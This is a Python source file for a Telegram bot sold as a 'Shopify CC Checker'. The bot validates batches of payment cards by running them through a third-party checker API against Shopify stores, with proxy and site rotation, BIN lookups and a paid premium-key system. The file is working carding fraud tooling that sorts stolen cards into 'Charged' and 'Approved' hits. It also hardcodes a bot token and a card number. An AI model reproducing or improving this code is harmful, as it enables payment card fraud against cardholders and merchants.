from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import string
import time
import json
import re
from datetime import datetime, timezone

# ─── Bot Configuration ────────────────────────────────────────────────────────
BOT_TOKEN = '8766840155:AAFJU4GU_ez5uVZTXoMO0bb7wcnYeQSpmFc'
OWNER_ID = 8836533598

# ─── Direct API endpoint ───────────────────────────────────────────────────────
CHECKER_API_BASE = 'https://stripe-auto-dsam.onrender.com/gateway=autostripe/key=xebec'

# ─── Channel / Group join requirement ─────────────────────────────────────────
CHANNEL_USERNAME = 'exportbot01'
GROUP_USERNAME = 'AutoShopifys'
CHANNEL_LINK = 'https://t.me/exportbot01'
GROUP_LINK = 'https://t.me/AutoShopifys'

# ─── File paths ───────────────────────────────────────────────────────────────
PREMIUM_FILE = 'premium.txt'
ADMINS_FILE = 'admins.txt'
BANNED_FILE = 'banned.txt'
KEYS_FILE = 'keys.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

# ─── Initialize bot ──────────────────────────────────────────────────────────
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}

# ─── Dead site keywords ───────────────────────────────────────────────────────
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

# ══════════════════════════════════════════════════════════════════════════════
#  FILE HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return []

def load_admins():   return get_file_lines(ADMINS_FILE)
def load_banned():   return get_file_lines(BANNED_FILE)
def load_sites():    return get_file_lines(SITES_FILE)
def load_proxies():  return get_file_lines(PROXY_FILE)

def is_admin(user_id):  return str(user_id) in load_admins() or user_id == OWNER_ID
def is_owner(user_id):  return user_id == OWNER_ID
def is_banned(user_id): return str(user_id) in load_banned()

def append_line(filepath, line):
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{line}\n")

def remove_line(filepath, value):
    lines = get_file_lines(filepath)
    with open(filepath, 'w', encoding='utf-8') as f:
        for l in lines:
            if l != str(value):
                f.write(f"{l}\n")

# ══════════════════════════════════════════════════════════════════════════════
#  PREMIUM EXPIRY SYSTEM
# ══════════════════════════════════════════════════════════════════════════════
PERMANENT_EXPIRY = 9_999_999_999

def _read_premium_entries():
    data = {}
    for line in get_file_lines(PREMIUM_FILE):
        parts = line.split('|')
        uid   = parts[0].strip()
        if len(parts) >= 2:
            try:    data[uid] = int(parts[1])
            except: data[uid] = PERMANENT_EXPIRY
        else:
            data[uid] = PERMANENT_EXPIRY
    return data

def _write_premium_entries(data):
    with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
        for uid, exp in data.items():
            f.write(f"{uid}|{exp}\n")

def is_premium(user_id):
    data = _read_premium_entries()
    uid  = str(user_id)
    return uid in data and data[uid] > int(time.time())

def get_premium_expiry(user_id):
    return _read_premium_entries().get(str(user_id), 0)

def get_premium_remaining_str(user_id):
    expiry = get_premium_expiry(user_id)
    if expiry >= PERMANENT_EXPIRY:
        return "Permanent"
    remaining = expiry - int(time.time())
    if remaining <= 0:
        return "Expired"
    days  = remaining // 86400
    hours = (remaining % 86400) // 3600
    if days > 0:
        return f"{days}d {hours}h"
    mins = (remaining % 3600) // 60
    return f"{hours}h {mins}m"

def set_premium(user_id, days):
    data   = _read_premium_entries()
    uid    = str(user_id)
    expiry = PERMANENT_EXPIRY if days == 0 else int(time.time()) + days * 86400
    data[uid] = expiry
    _write_premium_entries(data)

def remove_premium(user_id):
    data = _read_premium_entries()
    data.pop(str(user_id), None)
    _write_premium_entries(data)

# ══════════════════════════════════════════════════════════════════════════════
#  CHANNEL / GROUP MEMBERSHIP CHECK
# ══════════════════════════════════════════════════════════════════════════════
async def is_member(user_id, entity_username):
    try:
        p = await bot.get_permissions(entity_username, user_id)
        return p is not None
    except Exception:
        return False

async def check_membership(user_id):
    ch = await is_member(user_id, CHANNEL_USERNAME)
    gr = await is_member(user_id, GROUP_USERNAME)
    return ch, gr

# ══════════════════════════════════════════════════════════════════════════════
#  KEY SYSTEM
# ══════════════════════════════════════════════════════════════════════════════
KEY_PREFIX = "Ukraine"

def generate_key():
    suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    return f"{KEY_PREFIX}-{suffix}"

def save_key(key, days):
    append_line(KEYS_FILE, f"{key}|{days}|unused")

def redeem_key_for_user(key, user_id):
    lines     = get_file_lines(KEYS_FILE)
    new_lines = []
    found     = False
    days      = 0
    for line in lines:
        parts = line.split('|')
        if len(parts) == 3 and parts[0] == key:
            if parts[2] != 'unused':
                return False, 'already_used'
            found = True
            days  = int(parts[1])
            new_lines.append(f"{parts[0]}|{parts[1]}|{user_id}")
        else:
            new_lines.append(line)
    if not found:
        return False, 'not_found'
    with open(KEYS_FILE, 'w', encoding='utf-8') as f:
        for l in new_lines: f.write(f"{l}\n")
    return True, days

# ══════════════════════════════════════════════════════════════════════════════
#  CARD / BIN HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def extract_cc(text):
    cards = []
    for card, month, year, cvv in re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text):
        if len(year) == 2: year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg: return True
    return any(k in str(error_msg).lower() for k in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as res:
                if res.status != 200:
                    return 'BIN Not Found', '-', '-', '-', '-', ''
                d = json.loads(await res.text())
                return (d.get('brand','-'), d.get('type','-'), d.get('level','-'),
                        d.get('bank','-'), d.get('country_name','-'), d.get('country_flag',''))
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ══════════════════════════════════════════════════════════════════════════════
#  CARD CHECKING CORE
# ══════════════════════════════════════════════════════════════════════════════
async def check_card(card, site, proxy):
    try:
        if len(card.split('|')) != 4:
            return {'status':'Invalid','message':'Invalid format','card':card}
        api_url = f"{CHECKER_API_BASE}/site={site}/cc={card}"
        params  = {'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as resp:
                raw_text = await resp.text()
                if not raw_text or not raw_text.strip():
                    return {'status':'Site Error','message':'API returned empty response — retrying','card':card,'retry':True}
                try:
                    raw = json.loads(raw_text)
                except json.JSONDecodeError:
                    short = raw_text[:80].strip()
                    return {'status':'Site Error','message':f'Bad JSON: {short}','card':card,'retry':True}
        response_msg = raw.get('Response', '')
        price  = raw.get('Price', '-')
        gate   = raw.get('Gate', 'Shopify')
        status = raw.get('Status', '')
        if is_dead_site_error(response_msg):
            return {'status':'Site Error','message':response_msg,'card':card,'retry':True,'gateway':gate,'price':price}
        rl = response_msg.lower()
        if status == 'Charged' or 'order completed' in rl or '💎' in response_msg:
            return {'status':'Charged','message':response_msg,'card':card,'site':site,'gateway':gate,'price':price}
        elif 'cloudflare bypass failed' in rl:
            return {'status':'Site Error','message':'Cloudflare','card':card,'retry':True,'gateway':gate,'price':price}
        elif 'thank you' in rl or 'payment successful' in rl:
            return {'status':'Charged','message':response_msg,'card':card,'site':site,'gateway':gate,'price':price}
        elif status == 'Approved' or any(k in rl for k in [
            'approved','success','insufficient_funds','insufficient funds',
            'invalid_cvv','incorrect_cvv','invalid_cvc','incorrect_cvc',
            'invalid cvv','incorrect cvv','invalid cvc','incorrect cvc','incorrect_zip','incorrect zip'
        ]):
            return {'status':'Approved','message':response_msg,'card':card,'site':site,'gateway':gate,'price':price}
        else:
            return {'status':'Dead','message':response_msg,'card':card,'site':site,'gateway':gate,'price':price}
    except asyncio.TimeoutError:
        return {'status':'Site Error','message':'Timeout','card':card,'retry':True}
    except Exception as e:
        em = str(e)
        if is_dead_site_error(em):
            return {'status':'Site Error','message':em,'card':card,'retry':True}
        return {'status':'Dead','message':em,'card':card,'gateway':'Unknown','price':'-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites:   return {'status':'Dead','message':'No sites','card':card,'gateway':'Unknown','price':'-'}
    if not proxies: return {'status':'Dead','message':'No proxies','card':card,'gateway':'Unknown','price':'-'}
    last_result = None
    for attempt in range(max_retries):
        result = await check_card(card, random.choice(sites), random.choice(proxies))
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(2)
    if last_result:
        return {'status':'Dead','message':f'Site error: {last_result["message"]}','card':card,
                'gateway':last_result.get('gateway','Unknown'),'price':last_result.get('price','-'),'site':'Multiple'}
    return {'status':'Dead','message':'Max retries','card':card,'gateway':'Unknown','price':'-'}

# ══════════════════════════════════════════════════════════════════════════════
#  CUSTOM EMOJI CONSTANTS
# ══════════════════════════════════════════════════════════════════════════════
CE_MOON  = '<tg-emoji emoji-id="5195033767969839232">🌑</tg-emoji>'
CE_STAR  = '<tg-emoji emoji-id="5084974483685507801">⭐</tg-emoji>'
CE_CARD  = '<tg-emoji emoji-id="5472250091332993630">💳</tg-emoji>'
CE_CASH  = '<tg-emoji emoji-id="5226656353744862682">💵</tg-emoji>'
CE_GRAY  = '<tg-emoji emoji-id="5278622189556354905">⬛</tg-emoji>'
CE_REDX  = '<tg-emoji emoji-id="5042112436648281096">🔴</tg-emoji>'
CE_MASK  = '<tg-emoji emoji-id="5215327832040811010">🎭</tg-emoji>'
CE_ANIME = '<tg-emoji emoji-id="5958417144877160497">👤</tg-emoji>'
CE_CHECK = '<tg-emoji emoji-id="5895671830210940904">✅</tg-emoji>'
CE_CHAT  = '<tg-emoji emoji-id="5303138782004924588">💬</tg-emoji>'
CE_GHOST = '<tg-emoji emoji-id="5855207143724027916">👾</tg-emoji>'
CE_MONEYBAG = '<tg-emoji emoji-id="5348503265967355284">💰</tg-emoji>'
CE_FLAME2 = '<tg-emoji emoji-id="5345941618623005800">🔥</tg-emoji>'
CE_CROWN = '<tg-emoji emoji-id="5321304384838057247">👑</tg-emoji>'
CE_FLAME3 = '<tg-emoji emoji-id="5980995951160987855">🔥</tg-emoji>'
CE_WTB = '<tg-emoji emoji-id="5226656353744862682">💠</tg-emoji>'
CF_GHOST = '<tg-emoji emoji-id="5040036030414062506">👾</tg-emoji>'
CF_HAT = '<tg-emoji emoji-id="5134452506935427991">🎩</tg-emoji>'
CF_SHIELD = '<tg-emoji emoji-id="5197288647275071607">🛡</tg-emoji>'
CF_STAR = '<tg-emoji emoji-id="5084974483685507801">⭐</tg-emoji>'
CF_DRIP = '<tg-emoji emoji-id="5345941618623005800">💧</tg-emoji>'
CF_CARD2 = '<tg-emoji emoji-id="5980995951160987855">💳</tg-emoji>'
CF_CHAT = '<tg-emoji emoji-id="5303138782004924588">💬</tg-emoji>'

PREMIUM_EMOJI_IDS = {
    "⚡": "5226656353744862682",
    "🏅": "5278622189556354905",
    "✅": "5084974483685507801",
    "🔥": "5195033767969839232",
    "🔑": "4902715076873553054",
    "⚠️": "5172739056592749710",
    "❌": "5361696340348779794",
    "💳": "5980995951160987855",
    "💠": "5253652327734192243",
    "🤖": "5134452506935427991",
    "🛑": "5042112436648281096",
    "📝": "5852670420074893746",
    "🌐": "5042101437237036298",
    "🎯": "5854784287013867183",
    "🚀": "6025929752982852543",
    "💎": "5321304384838057247",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        ph = f"\x00PE{i:02d}\x00"
        placeholders.append((ph, doc_id, emoji))
        result = result.replace(emoji, ph)
    for ph, doc_id, emoji in placeholders:
        result = result.replace(ph, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ══════════════════════════════════════════════════════════════════════════════
#  /ran — REALTIME HIT & PROGRESS
# ══════════════════════════════════════════════════════════════════════════════
async def send_realtime_hit(user_id, result, hit_type, username):
    emoji       = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    message = (
        f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>\n"
        f"<blockquote>{emoji} Status: {status_text}</blockquote>\n"
        f"<blockquote>💳 Card: <code>{result['card']}</code></blockquote>\n"
        f"<blockquote>📝 Response: {result['message'][:150]}</blockquote>\n"
        f"<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway','Unknown')} | 💰 {result.get('price','-')}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>\n"
        f"<pre>𝗕𝗜𝗡: {brand} - {bin_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n\n"
        f"🤖 <b>Bot By: <a href=\"tg://user?id={OWNER_ID}\">Ukraine</a></b>"
    )
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except Exception:
        pass

def _ran_progress_text(results, current_count, username, user_id):
    total      = results['total']
    charged    = len(results['charged'])
    approved   = len(results['approved'])
    declined   = len(results['dead'])
    remaining  = total - current_count
    last_resp  = results.get('last_response', '—')[:60]
    last_card  = results.get('last_card', '')
    spoiler_cc = f"<tg-spoiler>{last_card}</tg-spoiler>" if last_card else "—"
    return (
        f"{CE_MOON} <b>𝗥𝗮𝗻𝗱𝗼𝗺 𝗙𝗶𝗹𝗲 𝗖𝗵𝗲𝗰𝗸</b>\n\n"
        f"{CE_STAR} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: <b>{last_resp}</b>\n"
        f"{CE_CARD} {spoiler_cc}\n\n"
        f"{CE_STAR} 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: <b>{current_count}/{total}</b>\n"
        f"{CE_CASH} 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: <b>{charged}</b>\n"
        f"{CE_GRAY} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: <b>{approved}</b>\n"
        f"{CE_REDX} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: <b>{declined}</b>\n"
        f"{CE_MASK} 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: <b>{remaining}</b>\n\n"
        f"{CE_ANIME} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href=\"tg://user?id={user_id}\">{username}</a>"
    )

async def update_progress(user_id, message_id, results, current_count, username, starter_id):
    text    = _ran_progress_text(results, current_count, username, user_id)
    buttons = [[Button.inline("🔴 𝗦𝘁𝗼𝗽 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴", f"stop_{starter_id}".encode())]]
    try:
        await bot.edit_message(user_id, message_id, text, buttons=buttons, parse_mode='html')
    except Exception:
        pass

async def send_final_results(user_id, results, username):
    elapsed   = int(time.time() - results['start_time'])
    h, m, s   = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    total     = results['total']
    charged   = len(results['charged'])
    approved  = len(results['approved'])
    declined  = len(results['dead'])
    last_resp = results.get('last_response', '—')[:60]
    last_card = results.get('last_card', '')
    spoiler   = f"<tg-spoiler>{last_card}</tg-spoiler>" if last_card else "—"

    summary = (
        f"{CE_MOON} <b>𝗥𝗮𝗻𝗱𝗼𝗺 𝗙𝗶𝗹𝗲 𝗖𝗵𝗲𝗰𝗸</b>\n\n"
        f"{CE_STAR} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: <b>{last_resp}</b>\n"
        f"{CE_CARD} {spoiler}\n\n"
        f"{CE_STAR} 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: <b>{total}/{total}</b>\n"
        f"{CE_CASH} 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: <b>{charged}</b>\n"
        f"{CE_GRAY} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: <b>{approved}</b>\n"
        f"{CE_REDX} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: <b>{declined}</b>\n"
        f"{CE_MASK} 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: <b>0</b>\n\n"
        f"{CE_ANIME} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href=\"tg://user?id={user_id}\">{username}</a>"
    )

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"ran_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write(f"RANDOM FILE CHECK RESULTS\nChecked by: @{username} | Time: {h}h {m}m {s}s\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"CHARGED ({charged}):\n" + "-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway','?')} | {r.get('price','-')} | {r['message'][:100]}\n")
        await f.write(f"\nAPPROVED ({approved}):\n" + "-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway','?')} | {r.get('price','-')} | {r['message'][:100]}\n")
        await f.write(f"\nDECLINED ({declined}):\n" + "-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway','?')} | {r.get('price','-')} | {r['message'][:100]}\n")

    await bot.send_message(user_id, summary, file=filename, parse_mode='html')
    try: os.remove(filename)
    except: pass

# ══════════════════════════════════════════════════════════════════════════════
#  PROXY / SITE TEST HELPERS
# ══════════════════════════════════════════════════════════════════════════════
async def test_proxy(proxy):
    try:
        test_card = "5154623245618097|03|2032|156"
        test_site  = "https://riverbendhomedev.myshopify.com"
        api_url    = f"{CHECKER_API_BASE}/site={test_site}/cc={test_card}"
        timeout    = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params={'proxy': proxy}) as resp:
                raw_text = await resp.text()
                if not raw_text or not raw_text.strip():
                    return {'proxy': proxy, 'status': 'dead'}
                try:
                    raw = json.loads(raw_text)
                except json.JSONDecodeError:
                    return {'proxy': proxy, 'status': 'dead'}
        rm = raw.get('Response', '').lower()
        if 'proxy dead' in rm or 'invalid proxy format' in rm or 'no proxy' in rm:
            return {'proxy': proxy, 'status': 'dead'}
        return {'proxy': proxy, 'status': 'alive'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

async def test_site(site, proxy):
    try:
        test_card = "5154623245618097|03|2032|156"
        api_url   = f"{CHECKER_API_BASE}/site={site}/cc={test_card}"
        timeout   = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params={'proxy': proxy}) as resp:
                raw_text = await resp.text()
                if not raw_text or not raw_text.strip():
                    return {'site': site, 'status': 'dead'}
                try:
                    raw = json.loads(raw_text)
                except json.JSONDecodeError:
                    return {'site': site, 'status': 'dead'}
        if is_dead_site_error(raw.get('Response', '').lower()):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except Exception:
        return {'site': site, 'status': 'dead'}

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════════════════════════════
MAIN_MENU_BUTTONS = [
    [Button.inline("📋 𝗖𝗠𝗗𝗦", b"cmds"), Button.inline("🌐 𝗦𝗲𝘁 𝗣𝗿𝗼𝘅𝘆", b"setproxy")],
    [Button.inline("🤖 𝗠𝘆 𝗣𝗿𝗼𝗳𝗶𝗹𝗲", b"myprofile")]
]

MAIN_MENU_TEXT = premium_emoji(
    "⚡ <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗖 𝗖𝗵𝗲𝗰𝗸𝗲𝗿</b>\n\n"
    "⚡ 𝗛𝗶𝗴𝗵-𝘀𝗽𝗲𝗲𝗱 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗴𝗮𝘁𝗲𝘄𝗮𝘆 𝗰𝗵𝗲𝗰𝗸𝗲𝗿\n"
    "⚡ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝘀 𝗮𝗹𝗹 𝗽𝗿𝗼𝘅𝘆 𝗳𝗼𝗿𝗺𝗮𝘁𝘀\n"
    "⚡ 𝗠𝘂𝗹𝘁𝗶-𝘀𝗶𝘁𝗲 𝗿𝗼𝘁𝗮𝘁𝗶𝗼𝗻 𝘄𝗶𝘁𝗵 𝗿𝗲𝘁𝗿𝘆 𝗹𝗼𝗴𝗶𝗰\n\n"
    "⚡ 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗴𝗲𝘁 𝘀𝘁𝗮𝗿𝘁𝗲𝗱:"
)

# ══════════════════════════════════════════════════════════════════════════════
#  /start — channel/group gate
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji(
            "🛑 <b>𝗬𝗼𝘂 𝗮𝗿𝗲 𝗯𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!</b>"
        ), parse_mode='html')
        return
    in_ch, in_gr = await check_membership(user_id)
    if not in_ch or not in_gr:
        await event.reply(
            premium_emoji(
                "⚠️ <b>Access Restricted</b>\n\n"
                "⭐ You must join our channel and group to use this bot.\n\n"
                "🔗 Tap the buttons below to join, then tap Verify."
            ),
            buttons=[
                [Button.url("Join Channel", CHANNEL_LINK), Button.url("Join Group", GROUP_LINK)],
                [Button.inline("✅ Verify Joined", b"verify_join")]
            ],
            parse_mode='html'
        )
        return
    await event.reply(MAIN_MENU_TEXT, buttons=MAIN_MENU_BUTTONS, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"verify_join"))
async def verify_join_cb(event):
    user_id = event.sender_id
    in_ch, in_gr = await check_membership(user_id)
    if in_ch and in_gr:
        await event.edit(MAIN_MENU_TEXT, buttons=MAIN_MENU_BUTTONS, parse_mode='html')
    else:
        missing = []
        if not in_ch: missing.append("Channel")
        if not in_gr: missing.append("Group")
        await event.answer(f"⚠️ Still not joined: {', '.join(missing)}", alert=True)

@bot.on(events.CallbackQuery(pattern=b"back_main"))
async def back_main_cb(event):
    await event.answer()
    await event.edit(MAIN_MENU_TEXT, buttons=MAIN_MENU_BUTTONS, parse_mode='html')

# ══════════════════════════════════════════════════════════════════════════════
#  INLINE CALLBACKS — CMDS / SET PROXY / MY PROFILE
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery(pattern=b"cmds"))
async def cmds_cb(event):
    await event.answer()
    await event.edit(
        premium_emoji(
            "⚡ <b>𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀</b>\n\n"
            "<b>💳 CC Commands</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv — Check single CC\n"
            "• /ran — Reply to .txt file to check cards</blockquote>\n\n"
            "<b>🌐 Site Commands</b>\n"
            "<blockquote>• /site — Check all sites & remove dead\n"
            "• /rm url — Remove a specific site</blockquote>\n\n"
            "<b>🔑 Key Commands</b>\n"
            "<blockquote>• /redeem key — Redeem a premium key</blockquote>\n\n"
            "<b>🤖 Proxy Commands</b>\n"
            "<blockquote>• /proxy — Check all proxies & remove dead\n"
            "• /addproxy — Add proxies (one per line)\n"
            "• /chkproxy proxy — Check single proxy\n"
            "• /rmproxy proxy — Remove single proxy\n"
            "• /clearproxy — Remove all proxies\n"
            "• /getproxy — Get all proxies</blockquote>\n\n"
            "<b>📝 Feedback</b>\n"
            "<blockquote>• /f message — Send feedback with a photo</blockquote>"
        ),
        buttons=[[Button.inline("⬅ 𝗕𝗮𝗰𝗸", b"back_main")]],
        parse_mode='html'
    )

@bot.on(events.CallbackQuery(pattern=b"setproxy"))
async def setproxy_cb(event):
    await event.answer()
    await event.edit(
        premium_emoji(
            "⚡ <b>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿</b>\n\n"
            "<blockquote>• /addproxy — Add proxies (one per line after command)\n"
            "• /getproxy — View all saved proxies\n"
            "• /chkproxy ip:port:user:pass — Test one proxy\n"
            "• /rmproxy ip:port:user:pass — Remove one proxy\n"
            "• /rmproxyindex 1,2,3 — Remove by index\n"
            "• /clearproxy — Remove ALL proxies\n"
            "• /proxy — Auto-check & remove dead proxies</blockquote>\n\n"
            "⚡ <b>Supported formats:</b>\n"
            "<code>host:port\nhost:port:user:pass\nuser:pass@host:port</code>"
        ),
        buttons=[[Button.inline("⬅ 𝗕𝗮𝗰𝗸", b"back_main")]],
        parse_mode='html'
    )

@bot.on(events.CallbackQuery(pattern=b"myprofile"))
async def myprofile_cb(event):
    user_id = event.sender_id
    await event.answer()
    try:
        sender = await event.get_sender()
        name   = (sender.first_name or '') + (' ' + sender.last_name if sender.last_name else '')
        uname  = f"@{sender.username}" if sender.username else "No username"
    except Exception:
        name, uname = "Unknown", "Unknown"

    prem      = is_premium(user_id)
    prem_plan = get_premium_remaining_str(user_id) if prem else None
    proxies   = load_proxies()

    if prem:
        plan_line = f"{CE_WTB} 𝗣𝗹𝗮𝗻: {CE_GRAY} <b>Premium ({prem_plan})</b>\n"
    else:
        plan_line = f"{CE_WTB} 𝗣𝗹𝗮𝗻: {CE_GRAY} <b>No Plan</b>\n"

    text = (
        f"{CE_CROWN} <b>𝗨𝘀𝗲𝗿 𝗣𝗿𝗼𝗳𝗶𝗹𝗲</b>\n\n"
        f"{CE_FLAME3} 𝗡𝗮𝗺𝗲: <b>{name}</b>\n"
        f"{CE_FLAME3} 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: <b>{uname}</b>\n"
        f"{CE_FLAME3} 𝗜𝗗: <code>{user_id}</code>\n\n"
        f"{plan_line}"
        f"{CE_STAR} 𝗣𝗿𝗼𝘅𝘆: {CE_GRAY} <b>{len(proxies)} proxies</b>"
    )
    await event.edit(
        text,
        buttons=[[Button.inline("⬅ 𝗕𝗮𝗰𝗸", b"back_main")]],
        parse_mode='html'
    )

# ══════════════════════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
def banned_reply():
    return premium_emoji("🛑 <b>𝗬𝗼𝘂 𝗮𝗿𝗲 𝗯𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!</b>")

@bot.on(events.NewMessage(pattern=r'^/admin\s+(\d+)$'))
async def admin_add(event):
    if not is_owner(event.sender_id):
        await event.reply(premium_emoji("❌ Only the bot owner can use this command."), parse_mode='html')
        return
    target_id = event.pattern_match.group(1)
    if target_id in load_admins():
        await event.reply(premium_emoji(f"⚠️ <code>{target_id}</code> is already an admin."), parse_mode='html')
        return
    append_line(ADMINS_FILE, target_id)
    await event.reply(premium_emoji(f"✅ <b>Admin Added!</b>\n\n<code>{target_id}</code> is now an admin."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/auth\s+(\d+)$'))
async def auth_user(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Only admins can use this command."), parse_mode='html')
        return
    target_id = int(event.pattern_match.group(1))
    set_premium(target_id, 0)
    await event.reply(premium_emoji(f"✅ <b>Premium Granted!</b>\n\n<code>{target_id}</code> now has permanent access."), parse_mode='html')
    try:
        await bot.send_message(target_id, premium_emoji(
            "🚀 <b>Congratulations!</b>\n\n⚡ You have been granted <b>Premium access</b>!\nUse /start to begin."
        ), parse_mode='html')
    except Exception:
        pass

@bot.on(events.NewMessage(pattern=r'^/unauth\s+(\d+)$'))
async def unauth_user(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Only admins can use this command."), parse_mode='html')
        return
    target_id = int(event.pattern_match.group(1))
    remove_premium(target_id)
    await event.reply(premium_emoji(f"✅ <b>Premium Removed!</b>\n\n<code>{target_id}</code> no longer has premium access."), parse_mode='html')
    try:
        await bot.send_message(target_id, premium_emoji("⚠️ <b>Premium Removed</b>\n\nYour premium access has been revoked."), parse_mode='html')
    except Exception:
        pass

